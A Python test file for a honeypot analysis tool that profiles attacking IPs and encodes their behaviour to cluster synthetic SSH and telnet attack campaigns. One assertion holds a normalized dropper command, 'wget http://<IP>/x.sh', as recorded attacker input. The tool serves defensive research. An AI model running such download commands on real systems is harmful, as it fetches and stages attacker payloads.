import numpy as np
import polars as pl
import pytest

from honeypot.analysis.ml.campaigns.profiles import (
    BEHAVIOUR_FEATURES,
    TOKEN_BLOCKS,
    campaign_encoder,
    ip_profiles,
)
from honeypot.analysis.ml.tests.fixtures import CAMPAIGNS, campaign_events


@pytest.fixture(scope="module")
def data() -> tuple[pl.DataFrame, pl.DataFrame]:
    events, truth = campaign_events(ips_per_campaign=20)
    return ip_profiles(events).join(truth, on="src_ip", maintain_order="left"), truth


def test_one_row_per_login_ip(data) -> None:
    profiles, truth = data
    assert profiles.height == truth.height
    assert profiles["src_ip"].is_unique().all()
    assert profiles["src_ip"].to_list() == sorted(profiles["src_ip"].to_list())


def test_profiles_carry_each_campaigns_signals(data) -> None:
    profiles, _ = data
    by_campaign = {
        campaign: profiles.filter(pl.col("campaign") == campaign)
        for campaign in CAMPAIGNS
    }
    dropper = by_campaign["ssh_dropper"]
    assert dropper["downloaded"].min() == 1.0
    assert "wget http://<IP>/x.sh" in dropper["commands"][0].to_list()
    assert "version=SSH-2.0-Go" in dropper["client"][0].to_list()

    telnet = by_campaign["telnet_bot"]
    assert telnet["telnet_share"].min() == 1.0
    # Busybox verification tag stripped by the shared normalization.
    assert "/bin/busybox" in telnet["commands"][0].to_list()
    assert telnet["client"][0].to_list()[0].startswith("telnet=")
    assert telnet["client"].list.len().max() == 1

    sprayer = by_campaign["ssh_sprayer"]
    assert sprayer["commands"].list.len().max() == 0
    assert sprayer["login_success_rate"].max() == 0
    assert sprayer["log_sessions"].mean() > dropper["log_sessions"].mean()
    assert any(t.startswith("pair=sp") for t in sprayer["credentials"][0].to_list())


def test_profiles_have_no_nulls_in_features(data) -> None:
    profiles, _ = data
    assert profiles.select(BEHAVIOUR_FEATURES).null_count().sum_horizontal()[0] == 0
    for block in TOKEN_BLOCKS:
        assert profiles[block].null_count() == 0


def test_encoder_blocks_and_unit_norm(data) -> None:
    profiles, _ = data
    encoder = campaign_encoder().fit(profiles)
    matrix = encoder.transform(profiles)

    slices = encoder.block_slices()
    assert list(slices) == ["credentials", "commands", "client", "behaviour"]
    assert matrix.shape == (profiles.height, slices["behaviour"].stop)
    assert len(encoder.feature_names()) == matrix.shape[1]
    norms = np.sqrt(np.asarray(matrix.multiply(matrix).sum(axis=1)).ravel())
    assert norms.max() == pytest.approx(1.0)
    # Each non-empty block holds a quarter of the squared norm.
    commands = matrix[:, slices["commands"]]
    row = int(np.flatnonzero(profiles["commands"].list.len().to_numpy() > 0)[0])
    assert commands[row].multiply(commands[row]).sum() == pytest.approx(0.25)


def test_encoder_learns_vocabulary_from_training_rows_only(data) -> None:
    profiles, _ = data
    train = profiles.filter(pl.col("campaign") != "ssh_dropper")
    encoder = campaign_encoder().fit(train)
    names = encoder.feature_names()
    assert not any("SSH-2.0-Go" in name for name in names)
    assert not any("pair=sd" in name for name in names)

    dropper = profiles.filter(pl.col("campaign") == "ssh_dropper")
    matrix = encoder.transform(dropper)
    client = matrix[:, encoder.block_slices()["client"]]
    # Unseen fingerprint -> zeros, not an error.
    assert client.nnz == 0


def test_zero_weight_drops_a_block(data) -> None:
    profiles, _ = data
    encoder = campaign_encoder(
        weights={"credentials": 0, "commands": 1, "client": 1, "behaviour": 1}
    ).fit(profiles)
    assert "credentials" not in encoder.block_slices()
    norms = np.sqrt(
        np.asarray(
            encoder.transform(profiles).multiply(encoder.transform(profiles)).sum(1)
        ).ravel()
    )
    assert norms.max() == pytest.approx(1.0)
